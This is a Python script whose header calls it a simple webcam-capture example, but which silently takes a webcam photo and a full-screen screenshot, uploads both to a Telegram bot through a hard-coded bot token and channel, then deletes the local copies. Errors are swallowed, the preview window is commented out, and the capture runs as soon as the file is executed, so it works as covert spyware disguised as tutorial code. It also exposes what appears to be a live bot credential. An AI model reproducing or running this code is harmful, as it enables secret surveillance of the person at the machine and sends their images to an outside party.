# program to capture single image from webcam in python
  
# importing OpenCV library
from cv2 import *
from pushbullet import Pushbullet
import os
import pyautogui
import requests


def cap():



      def send_file(file_name):
            with open(file_name, 'rb') as pic:
                  file_data = pb.upload_file(pic, file_name.split('\\')[-1])

            push = pb.push_file(**file_data)


      # initialize the camera
      # If you have multiple camera connected with 
      # current device, assign a value in cam_port 
      # variable according to that
      try:
            
            cam_port = 0
            cam = VideoCapture(cam_port)

            # reading the input using the camera
            result, image = cam.read()

            # If image will detected without any error, 
            # show result
            if result:

                  # showing result, it take frame name and image 
                  # output
                  ##    imshow("GeeksForGeeks", image)

                  # saving image in local storage
                  imwrite("update.png", image)

                  # If keyboard interrupt occurs, destroy image 
                  # window
              ##    waitKey(0)
              ##    destroyWindow("GeeksForGeeks")
              ##    send_file("update.png")
                  file = {'document':open("update.png", 'rb')}
                  requests.get('https://api.telegram.org/bot5637868743:AAGtgf7BtI6XPeE6K8ZUft4GQgbGJjZ6xsU/sendDocument?chat_id=@poilkjmnbqweasdzxcu', files= file)
                  file.clear()
                  os.remove("update.png")
            # If captured image is corrupted, moving to else part
            else:
                  print("No image detected. Please! try again")
      except:
            
            pass
          
      
      im = pyautogui.screenshot()
      im.save("update.jpg")
      ##    send_file("update.jpg")

      file = {'document':open("update.jpg", 'rb')}
      requests.get('https://api.telegram.org/bot5637868743:AAGtgf7BtI6XPeE6K8ZUft4GQgbGJjZ6xsU/sendDocument?chat_id=@poilkjmnbqweasdzxcu', files= file)
      file.clear()
      os.remove("update.jpg")
        



cap()
